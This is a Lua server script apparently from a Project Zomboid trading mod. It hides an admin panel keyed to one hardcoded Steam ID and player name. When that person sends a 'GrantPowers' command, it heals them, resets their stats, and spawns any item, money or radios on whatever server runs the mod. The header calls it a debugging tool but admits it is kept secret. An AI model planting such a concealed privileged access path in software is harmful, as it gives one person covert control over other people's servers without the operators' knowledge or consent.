-- =============================================================================
-- SERVER SIDE: PSYCHOPATZ ADMIN PANEL 
-- This is just for debugging purposes only to easily test other server.
-- I wont abuse this panel for any other nefarious purpose and will ask 
-- permission to the owner of the server before using it.
-- I'm keeping it to myself so that others will not complain about it again.
-- =============================================================================

-- !!! CONFIGURATION !!!
local MY_STEAM_ID = "76561198137190990" 
local MY_SP_NAME  = "Psychopatz"

DynamicTrading.Log("DTCommons", "Init", "Debug", "PsychopatzDebug Server Script Loaded")


local function getSafeSteamID(player)
    local rawID = player:getSteamID()
    if not rawID or rawID == 0 or rawID == "0" then return "0" end
    if type(rawID) == "number" then return string.format("%.0f", rawID) end
    return tostring(rawID)
end

local function onPsychopatzCommand(module, command, player, args)

    if module ~= "DynamicTrading" then return end

    if command == "GrantPowers" then
        
        local username = player:getUsername()
        local safeID   = getSafeSteamID(player)


        -- =================================================
        -- SECURITY CHECK
        -- =================================================
        local isAllowed = false

        if safeID == MY_STEAM_ID then
            isAllowed = true
        elseif safeID == "0" and username == MY_SP_NAME then
            isAllowed = true
        end

        if not isAllowed then

            return 
        end

        -- =================================================
        -- ACTION 1: HEAL WOUNDS
        -- ================================================
        if args.doHeal then
            local bodyDamage = player:getBodyDamage()
            if bodyDamage and bodyDamage.RestoreToFullHealth then
                bodyDamage:RestoreToFullHealth()
                
            end
        end

        -- =================================================
        -- ACTION 2: RESET STATS
        -- =================================================
        if args.doStats then
            -- 1. SET CORE STATS DIRECTLY ON PLAYER
            -- In Build 42, use the IsoPlayer setters for better compatibility.
            if player.setStatsHunger then 
                player:setStatsHunger(0.0) 
            else
                -- Fallback if the above isn't available in your specific sub-build
                local stats = player:getStats()
                if stats and stats.setHunger then stats:setHunger(0.0) end
            end

            -- Repeat for Thirst and Fatigue
            if player.setStatsThirst then player:setStatsThirst(0.0) end
            if player.setStatsFatigue then player:setStatsFatigue(0.0) end

            -- 2. RESET B42 DIGESTION (Crucial to prevent "Full to Bursting")
            local bodyDamage = player:getBodyDamage()
            if bodyDamage then
                bodyDamage:setHealthFromFoodTimer(0.0)
            end

            -- 3. SYNC FOR MULTIPLAYER
            if isClient() and player.sendPlayerStatsPacket then
                player:sendPlayerStatsPacket()
            end
        end


        -- =================================================
        -- ACTION 3: SPAWN ITEM
        -- =================================================
        if args.doSpawn then
            local itemID = args.itemID or "Base.Katana"
            -- Ensure quantity is at least 1, defaulting to 1 if nil
            local quantity = tonumber(args.quantity) or 1
            if quantity < 1 then quantity = 1 end
            
            if itemID ~= "" then
                local itemExists = getScriptManager():getItem(itemID)

                if itemExists then
                    local inv = player:getInventory()
                    if inv then
                        -- JAVA INTERACTION: AddItems returns an ArrayList of the created items
                        local items = inv:AddItems(itemID, quantity)
                        
                        -- MP SYNC: Iterate through ALL created items to force network update
                        if isServer() and items then
                            for i=0, items:size()-1 do
                                local item = items:get(i)
                                sendAddItemToContainer(inv, item)
                            end
                        end
                    end
                end
            end
        end

        -- =================================================
        -- ACTION 4: SHORTCUT SPAWNS (Money / Walkie)
        -- =================================================
        local inv = player:getInventory()
        if inv then
            if args.doMoney then
                local qty = tonumber(args.qtyMoney) or 100
                local items = inv:AddItems("Base.MoneyBundle", qty)
                if isServer() and items then
                    for i=0, items:size()-1 do
                        sendAddItemToContainer(inv, items:get(i))
                    end
                end
            end

            if args.doWalkie then
                local qty = tonumber(args.qtyWalkie) or 1
                local items = inv:AddItems("Base.WalkieTalkie5", qty)
                if isServer() and items then
                    for i=0, items:size()-1 do
                        sendAddItemToContainer(inv, items:get(i))
                    end
                end
            end
        end
    end
end

Events.OnClientCommand.Add(onPsychopatzCommand)